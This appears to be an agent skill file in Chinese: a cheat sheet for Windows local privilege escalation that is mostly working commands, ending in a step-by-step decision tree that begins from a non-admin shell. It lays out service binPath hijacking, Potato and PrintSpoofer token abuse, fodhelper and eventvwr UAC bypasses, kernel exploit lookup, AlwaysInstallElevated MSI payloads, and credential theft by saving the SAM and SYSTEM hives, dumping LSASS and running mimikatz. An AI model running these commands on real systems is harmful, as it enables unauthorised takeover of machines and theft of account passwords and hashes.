---
name: privilege-escalation-windows
description: Windows本地提权，覆盖信息收集→服务提权→Token窃取→UAC绕过→PrintSpoofer→内核Exploit→凭证窃取→AlwaysInstallElevated全流程
---

# Windows本地提权

## 1. 信息收集

```powershell
# 基础信息
whoami /all; systeminfo; hostname
net user; net localgroup; net localgroup Administrators
tasklist /svc; netstat -ano
wmic qfe list brief; wmic product get name,version

# 自动枚举
# WinPEAS: .\winPEASx64.exe
# PowerUp: . .\PowerUp.ps1; Invoke-AllChecks
# Seatbelt: .\Seatbelt.exe -group=all
```

## 2. 服务提权

### 2.1 服务权限配置错误

```powershell
# 查找可修改的服务
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv Users *
# 重点关注: SERVICE_CHANGE_CONFIG / SERVICE_ALL_ACCESS

# 修改服务二进制路径
sc config <service> binPath="C:\temp\shell.exe"
sc start <service>
```

### 2.2 未引号服务路径

```powershell
wmic service get name,pathname | findstr /i /v "C:\Windows"
# 如: C:\Program Files\Vuln App\service.exe
# 利用: C:\Program.exe 或 C:\Program Files\Vuln.exe
```

## 3. Token窃取

```powershell
# Potato家族:
# JuicyPotato (Windows < 1803 + SeImpersonate)
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *

# PrintSpoofer (Windows 10/11 + SeImpersonate)
PrintSpoofer.exe -c "whoami"
PrintSpoofer.exe -i -c "powershell -ep bypass"

# RoguePotato / SweetPotato / GodPotato
GodPotato.exe -cmd "cmd /c whoami"

# SeImpersonate/SeAssignPrimaryToken检查:
whoami /priv | findstr "SeImpersonate SeAssignPrimaryToken"
```

## 4. UAC绕过

```powershell
# UAC等级检查
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA

# fodhelper (Windows 10/11)
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /f
fodhelper.exe

# eventvwr (Windows < 10 1703)
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
eventvwr.exe
```

## 5. 内核Exploit

```bash
# 收集补丁信息
systeminfo; wmic qfe list brief

# Watson: .\Watson.exe
# Sherlock: . .\Sherlock.ps1; Find-AllVulns
# Windows-Exploit-Suggester: ./wes.py systeminfo.txt

# 常见:
# MS16-032 (Secondary Logon)
# MS17-010 (EternalBlue, 也可用做本地提权)
# CVE-2021-36934 (HiveNightmare/SeriousSAM)
# CVE-2022-21882 (Win32k)
```

## 6. 凭证窃取

```powershell
# SAM/SYSTEM 提取
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
# → secretsdump.py -sam sam.hive -system system.hive LOCAL

# LSASS 内存转储
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# → mimikatz sekurlsa::minidump lsass.dmp → sekurlsa::logonpasswords

# mimikatz (需SeDebugPrivilege)
privilege::debug; sekurlsa::logonpasswords
sekurlsa::ekeys; lsadump::sam
```

## 7. 其他提权

```powershell
# AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# 都返回1 → msfvenom生成.msi → msiexec /quiet /qn /i payload.msi

# 可写PATH目录
icacls C:\Program Files\Common Files

# 启动项
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

## 8. 决策树

```
拿到Shell (非管理员)
├─ whoami /priv → SeImpersonate → Potato/PrintSpoofer
├─ whoami /priv → SeDebugPrivilege → mimikatz
├─ net localgroup Administrators → 已在管理员组 → UAC绕过
├─ systeminfo → 缺补丁 → 内核Exploit
├─ sc query → 可修改服务 → 写二进制路径
├─ AlwaysInstallElevated → MSI提权
├─ Token窃取 → Incognito / RotatePotato
└─ WinPEAS全面扫描 → 按提示逐一尝试
```

---

*参考: HackTricks + PayloadAllTheThings + 实战经验*
